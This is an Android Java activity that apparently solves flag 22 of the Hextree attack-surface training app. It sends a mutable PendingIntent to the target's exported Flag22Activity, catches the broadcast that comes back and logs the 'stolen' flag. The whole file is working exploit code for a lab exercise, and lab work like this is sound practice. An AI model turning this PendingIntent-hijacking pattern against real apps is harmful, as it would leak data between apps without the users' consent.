package com.android.zerohextree;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class flag22 extends AppCompatActivity {

    private static final String TAG = "EXPLOIT_FLAG22";
    private BroadcastReceiver flagReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Register dynamic receiver (no manifest declaration needed)
        flagReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String flag = intent.getStringExtra("flag");
                Log.d(TAG, "Stolen Flag: " + flag);
                unregisterReceiver(this);
                finish();
            }
        };

        IntentFilter filter = new IntentFilter("com.malicious.app.ACTION_STEAL_FLAG");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(
                    flagReceiver,
                    filter,
                    Context.RECEIVER_NOT_EXPORTED // Fix for Android 13+ requirement
            );
        }

        launchAttack();
    }

    private void launchAttack() {
        try {
            Intent maliciousIntent = new Intent("com.malicious.app.ACTION_STEAL_FLAG");
            maliciousIntent.setPackage(getPackageName());

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    0,
                    maliciousIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
            );

            Intent exploitIntent = new Intent()
                    .setClassName(
                            "io.hextree.attacksurface",
                            "io.hextree.attacksurface.activities.Flag22Activity"
                    )
                    .putExtra("PENDING", pendingIntent);

            startActivity(exploitIntent);
            Log.d(TAG, "Exploit triggered successfully");

        } catch (Exception e) {
            Log.e(TAG, "Exploit failed", e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (flagReceiver != null) {
            unregisterReceiver(flagReceiver);
        }
    }
}